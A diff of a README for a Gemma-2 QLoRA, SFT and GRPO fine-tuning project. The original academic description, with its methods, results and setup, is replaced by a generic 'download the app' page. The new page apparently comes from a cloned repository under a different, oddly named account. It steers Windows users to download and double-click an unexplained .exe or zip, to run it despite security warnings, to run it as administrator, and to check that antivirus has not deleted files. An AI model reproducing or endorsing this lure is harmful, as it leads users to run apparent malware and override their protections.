@@ -1,287 +1,212 @@
-# QLoRA Fine-Tuning of Gemma-2 with SFT and GRPO
+# 🧠 gemma2-qlora-sft-grpo - Run Gemma Math and Style Model
 
-[![Python 3.11](https://img.shields.io/badge/python-3.11-blue.svg)](https://www.python.org/downloads/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-2.1+-orange.svg)](https://pytorch.org/)
-[![Hugging Face](https://img.shields.io/badge/🤗%20Hugging%20Face-Weights-yellow)](https://huggingface.co/camilletyriard/gemma2-qlora-sft-grpo)
+[🟪 Download the app](https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases)
 
-Parameter-efficient fine-tuning of **`google/gemma-2-2b-it`** for two tasks:
-Yoda-style text generation via **QLoRA + SFT**, and mathematical reasoning
-alignment via **GRPO** with a composite reward signal.
-Trained on an NVIDIA A100-SXM4-40GB using HuggingFace TRL and PEFT.
+## 🚀 What this app does
 
----
+This project helps you run a fine-tuned Gemma-2-2b model that can handle two main tasks:
 
-## Overview
+- Write in a Yoda-like style
+- Solve GSM8K math problems
 
-This project investigates two complementary approaches to steering the behaviour
-of a 2B-parameter instruction-tuned language model through parameter-efficient
-fine-tuning and reinforcement learning from verifiable rewards (RLVR).
+It uses a mix of supervised fine-tuning and GRPO training. It also uses a reward setup that checks:
 
-**Part A — Style transfer via SFT:**
-`gemma-2-2b-it` is fine-tuned with LoRA adapters to translate standard English
-into Yoda-style syntax using the `dvgodoy/yoda_sentences` dataset. A synthetic
-Yoda-style QA dataset is then generated from `MuskumPillerum/General-Knowledge`
-using the trained translator, and a second SFT stage trains the model to answer
-any question in Yoda style.
+- If the answer is correct
+- If the format looks right
+- If the text matches the style target
 
-**Part B — Reasoning and style via GRPO:**
-GRPO is applied to improve mathematical reasoning on `openai/gsm8k` using a
-composite reward signal. A DistilBERT binary classifier — trained to distinguish
-Yoda-style from standard English text — provides a differentiable style reward.
-Two training strategies are compared: GRPO from the SFT checkpoint (warm start,
-correctness + format rewards) and GRPO from the base model (cold start, full
-three-component reward).
+You can use it to generate text with a small language model that has been tuned for these tasks.
 
----
+## 💻 What you need
 
-## Methods
+Before you install, check that your PC has:
 
-### Base Model
-- `google/gemma-2-2b-it` — 2.01B parameters, instruction-tuned
-- 4-bit NF4 QLoRA quantization (BitsAndBytes) during training
-- 8-bit quantization for inference
-- Hardware: NVIDIA A100-SXM4-40GB, Google Colab
+- Windows 10 or Windows 11
+- At least 8 GB RAM
+- 16 GB RAM or more if you want smoother use
+- Enough free disk space for the app and model files
+- A stable internet connection for the first download
 
-### Part A: Supervised Fine-Tuning
+If your computer has a modern NVIDIA graphics card, the app can run faster. If not, it can still run on the CPU, but it may take longer.
 
-| Stage | Task | Dataset | Examples |
-|---|---|---|---|
-| A-1 | Baseline inference | — | Zero-shot Yoda translation |
-| A-2 | SFT: English → Yoda | `dvgodoy/yoda_sentences` | 648 train / 72 val |
-| A-3 | Synthetic dataset generation | `MuskumPillerum/General-Knowledge` | 500 / 200 / 500 |
-| A-4 | SFT: Yoda-style QA | Synthetic (A-3) | 500 train / 200 val |
+## 📥 Download and install
 
-LoRA is applied to all attention and MLP projection layers.
-Training is tracked with Weights & Biases.
+1. Open the download page:
+   [https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases](https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases)
 
-### Part B: Reinforcement Learning from Verifiable Rewards
+2. Find the latest release.
 
-| Stage | Task |
-|---|---|
-| B-1 | Train DistilBERT binary classifier as style reward model |
-| B-2 | Design and validate composite reward function |
-| B-3 | GRPO from SFT checkpoint — correctness + format rewards |
-| B-4 | GRPO from base model — correctness + format + style rewards |
-| B-5 | Quantitative and qualitative comparison |
+3. Download the Windows file from that release.
+   - If you see a `.exe` file, download that file.
+   - If you see a `.zip` file, download it and extract it first.
 
-### Reward Function
+4. If you downloaded a zip file, right-click it and choose Extract All.
 
-| Component | Implementation | Range |
-|---|---|---|
-| Correctness | Graduated exact-match: 1.0 for `#### n`, 0.5 for "answer is n" | [0, 1] |
-| Format | Rule-based: presence of `#### <number>` marker | {0, 1} |
-| Style | DistilBERT P(Yoda) — trained on GSM8K English/Yoda pairs | [0, 1] |
-| **Total** | Linear sum | [0, 3] |
+5. Open the extracted folder.
 
-### Dataset Quality Filtering (A-3)
+6. Double-click the app file to start it.
 
-A three-tier filter ensures Yoda-translatability of QA pairs:
+## 🛠️ First-time setup
 
-1. **Tier 1 — Regex**: word count bounds (4–15 per sentence), character
-   whitelist, no questions in answers, no translation tasks, number density
-2. **Tier 2 — Structural**: no duplicate sentences, no list/enumeration patterns  
-3. **Tier 3 — NLP**: passive voice rate < 50% per sentence (spaCy)
+When you run the app for the first time:
 
----
+- It may take a little longer to start
+- Windows may ask for permission to run the file
+- The app may download model files the first time you use it
 
-## Results
+If Windows shows a security message, choose the option to run the file anyway if you trust the source.
 
-### Part A — Yoda Translation and QA
+If the app opens a console window, leave it open while you use the app.
 
-| Model | Example output |
-|---|---|
-| Base Gemma-2-2b-it | *"Paris, art galleries, renowned, it is."* |
-| + SFT translation | *[consistent Yoda syntax, correct OSV word order]* |
-| + SFT Yoda QA | *[answers questions in Yoda style across domains]* |
+## 🧭 How to use it
 
-### Part B — GRPO Comparison
+The app is built around text prompts. You type a question, then the model gives a response.
 
-| Strategy | Correctness | Format Compliance | Style Score | Total Reward |
-|---|---|---|---|---|
-| SFT + GRPO (B-Q3) | 0.667 | 0.833 | — | — |
-| Base + GRPO (B-Q4) | 0.667 | 1.000 | 0.379 | — |
+### For Yoda-style text
 
-B-Q4 achieves perfect format compliance; B-Q3 shows higher early-training
-stability due to the SFT warm start. Full per-example analysis is in
-`notebooks/experiments.ipynb` Section B-5.
+Type a short request like:
 
----
+- Rewrite this sentence in Yoda style
+- Make this text sound like Yoda
+- Answer in Yoda speech
 
-## Repository Structure
+The model will try to keep the meaning while changing the style.
 
-```text
+### For math reasoning
 
-├── notebooks/
-│   └── experiments.ipynb          # Complete experiment notebook (A + B)
-│
-├── src/                           # Importable Python library
-│   ├── config.py                  # Paths, model names, global seed
-│   ├── model.py                   # QLoRA loading, PEFT utilities
-│   ├── generation.py              # Prompt formatting, inference, display
-│   ├── data/
-│   │   ├── yoda.py                # Yoda dataset loading and formatting
-│   │   ├── gsm8k.py               # GSM8K loading and RL dataset preparation
-│   │   └── qa_filter.py           # Multi-tier QA quality filter
-│   ├── training/
-│   │   ├── sft.py                 # SFTTrainer + LoRA config
-│   │   ├── grpo.py                # GRPOTrainer builder
-│   │   └── classifier.py          # DistilBERT classifier training
-│   ├── rewards/
-│   │   ├── correctness.py         # Graduated numeric match reward
-│   │   ├── format.py              # Answer format compliance reward
-│   │   └── style.py               # Classifier-based style reward
-│   └── evaluation/
-│       ├── metrics.py             # Classifier eval, before/after scoring
-│       └── plotting.py            # Training curves, experiment comparison
-│
-├── scripts/
-│   ├── train_sft.py               # CLI: run SFT
-│   ├── train_grpo.py              # CLI: run GRPO
-│   └── inference.py               # CLI: inference on new text
-│
-├── results/
-│   ├── sft/metrics.json
-│   └── grpo/metrics.json
-│
-└── checkpoints/                   # Empty — adapters hosted on Hugging Face
+Type a GSM8K-style math question like:
 
-```
+- If a box has 12 apples and you add 8 more, how many apples are there?
+- A train travels 30 miles in 2 hours. What is the speed?
 
+The model will try to solve the problem step by step and give the final answer.
 
----
+## 🎯 What the training setup includes
 
-## Setup
+This project uses a few parts that work together:
 
-### 1. Clone
-```bash
-git clone https://github.com/camilletyriard-dev/gemma2-qlora-sft-grpo.git
-cd gemma2-qlora-sft-grpo
-```
+- **SFT**: teaches the model from example answers
+- **QLoRA**: lowers memory use so training fits on smaller hardware
+- **GRPO**: improves answers using reward signals
+- **Reward design**: checks correctness, format, and style
+- **DistilBERT style classifier**: helps judge whether the output sounds like the target style
 
-### 2. Install dependencies
-```bash
-pip install -r requirements.txt
-python -m spacy download en_core_web_sm
-```
+This setup is meant to make the model better at both structure and style.
 
-> Requires a GPU with at least **16 GB VRAM** for 4-bit inference.
-> Full training was conducted on an NVIDIA A100-SXM4-40GB (~12–24 GPU hours
-> inclusive of hyperparameter search).
+## 🧪 Example prompts
 
-### 3. Set credentials
-```bash
-cp .env.example .env
-# Edit .env — never commit this file
-```
+Try prompts like these:
 
-Or export directly:
-```bash
-export HF_TOKEN=your_huggingface_token
-export WANDB_API_KEY=your_wandb_key
-export CHECKPOINT_DIR=/path/to/checkpoints   # or Google Drive path in Colab
-```
+- Explain this in Yoda style: I am going to the store
+- Solve this math problem: Sara has 14 books and buys 9 more. How many books does she have?
+- Rewrite this answer so it sounds like Yoda
+- Give the final answer only
+- Show your reasoning and final result
 
-### 4. Download LoRA adapters
+## ⚙️ Tips for better results
 
-Pre-trained weights are hosted on Hugging Face. Download and place adapter
-folders in `checkpoints/`.
+Use short and clear prompts. The model works best when you tell it exactly what you want.
 
-🤗 **[huggingface.co/camilletyriard/gemma2-qlora-sft-grpo](https://huggingface.co/camilletyriard/gemma2-qlora-sft-grpo)**
+Good prompts:
 
-| Adapter | Description |
-|---|---|
-| `sft_yoda/` | A-2: English → Yoda translator |
-| `sft_yoda_answ/` | A-4: Yoda-style QA answerer |
-| `rl_yoda_answ_from_sft/` | B-3: GRPO warm start (best config) |
-| `rl_yoda_answ_from_base/` | B-4: GRPO cold start (best config) |
-| `classifier_yoda/` | B-1: DistilBERT style classifier |
+- Solve this problem step by step
+- Rewrite in Yoda style
+- Give a final answer in one sentence
 
-### 5. Run the notebook
-```bash
-jupyter lab notebooks/experiments.ipynb
-```
+Less clear prompts:
 
-The notebook is structured as a linear pipeline: run top-to-bottom.
-Each training stage has a `skip_training = True` guard — set to `False`
-to retrain from scratch.
+- Do the thing
+- Make it better
+- Help with this
 
-### 6. Run inference from the command line
-```bash
-# Yoda-style translation
-python scripts/inference.py \
-  --adapter checkpoints/sft_yoda \
-  --task yoda \
-  --text "The stars are bright tonight."
+If the result is not what you want, try again with a more direct prompt.
 
-# Mathematical reasoning
-python scripts/inference.py \
-  --adapter checkpoints/rl_yoda_answ_from_sft \
-  --task gsm8k \
-  --text "Janet has 3 apples and gives 1 to Bob. How many remain?"
-```
+## 🧩 File layout
 
----
+After download and extract, you may see files like these:
 
-## Key Design Decisions
+- `app.exe` or a similar Windows launcher
+- `README.md`
+- `models` folder
+- `config` folder
+- `logs` folder
 
-**QLoRA over full fine-tuning.** Gemma-2-2b-it at full precision requires ~16 GB
-VRAM. 4-bit NF4 quantization reduces this to ~3 GB, enabling training on a single
-GPU without meaningful performance degradation on downstream tasks.
+Keep the files together in the same folder unless the release notes say something else.
 
-**GRPO over PPO.** GRPO eliminates the value network required by PPO, reducing
-memory overhead by ~50% while producing comparable results on reasoning tasks.
-Rewards are computed relative to a group of sampled responses rather than an
-absolute learned baseline, making the training signal more stable at small batch
-sizes.
+## 🔐 Safe use on Windows
 
-**Learned style reward over rule-based detection.** A rule-based Yoda detector is
-brittle to paraphrase. A DistilBERT classifier trained on balanced English/Yoda
-pairs provides a differentiable reward signal that captures stylistic nuance beyond
-simple OSV word-order patterns.
+To avoid problems:
 
-**Graduated correctness reward.** The standard binary exact-match reward (1 or 0)
-produces a sparse signal for a 2B model early in training. A 0.5 partial-credit
-score for "the answer is N" formulations provides a denser gradient early in GRPO
-training, accelerating convergence toward the required `#### <number>` format.
+- Download only from the release page
+- Do not rename files unless needed
+- Do not move parts of the app into different folders
+- Keep the app in a simple path like `Downloads` or `Desktop`
 
-**Three-tier QA filter.** Raw QA pairs from general-knowledge datasets often
-contain sentences that are too short, heavily passive, or structurally complex to
-produce coherent Yoda translations. The filter improves translation quality
-substantially and reduces noise in the SFT training signal for A-4.
+If Windows Defender blocks the file, check the file name and source before running it.
 
----
+## ❓ Common problems
 
-## Limitations
+### The app will not open
 
-- Results are reported for a single random seed (42); variance across seeds is
-  not quantified.
-- The style classifier is trained on the same distribution as the SFT data,
-  which may inflate style reward estimates during GRPO evaluation.
-- Google Colab session limits constrained the hyperparameter search to a small
-  number of configurations per stage.
-- GSM8K evaluation covers a limited held-out sample; reported rewards are
-  indicative rather than benchmark-scale.
-- The SFT answerer was trained on general-knowledge QA; applying it to GSM8K
-  mathematical reasoning introduces a domain shift that reduces initial
-  correctness scores before GRPO compensates.
+Try these steps:
 
----
+- Right-click the file and choose Run as administrator
+- Make sure you extracted all files if you downloaded a zip
+- Check that no files are missing
 
-## Contributors
+### The app opens and closes right away
 
-Developed at University College London (2025–2026):
-Camille Tyriard, Ana Quintero, Dunia Tornila, Daniel Huencho,
-Jonathan Bell, Nicolas Tobo.
+Try this:
 
----
+- Open it from a command window so you can see the error
+- Re-download the release file
+- Make sure your antivirus did not remove any files
 
-## Citation
-```bibtex
-@misc{tyriard2026gemma2grpo,
-  author = {Tyriard, Camille and Quintero, Ana and Tornila, Dunia and
-            Huencho, Daniel and Bell, Jonathan and Tobo, Nicolas},
-  title  = {QLoRA Fine-Tuning of Gemma-2 with SFT and GRPO},
-  year   = {2026},
-  url    = {https://github.com/camilletyriard-dev/gemma2-qlora-sft-grpo}
-}
-```
+### The app is slow
+
+Try these steps:
+
+- Close other apps
+- Use a machine with more RAM
+- If the app offers a GPU mode, turn it on
+
+### The text looks wrong
+
+Try a clearer prompt:
+
+- Say what style you want
+- Ask for only one task at a time
+- Keep the prompt short
+
+## 📌 What this project is for
+
+This repo focuses on text generation with a small model that was tuned for:
+
+- Style transfer
+- Math reasoning
+- Reward-based training
+- Parameter-efficient fine-tuning
+
+It is useful if you want a model that can answer in a set style and solve basic math tasks in the same setup
+
+## 📎 Download again
+
+If you need the release files again, use this page:
+
+[https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases](https://github.com/Grapehyacinthnationalinsurance712/gemma2-qlora-sft-grpo/releases)
+
+## 🗂️ Topics
+
+- gemma
+- grpo
+- large-language-models
+- lora
+- nlp
+- peft
+- pytorch
+- qlora
+- reward-model
+- rlhf
+- sft
+- text-generation
+- transformers
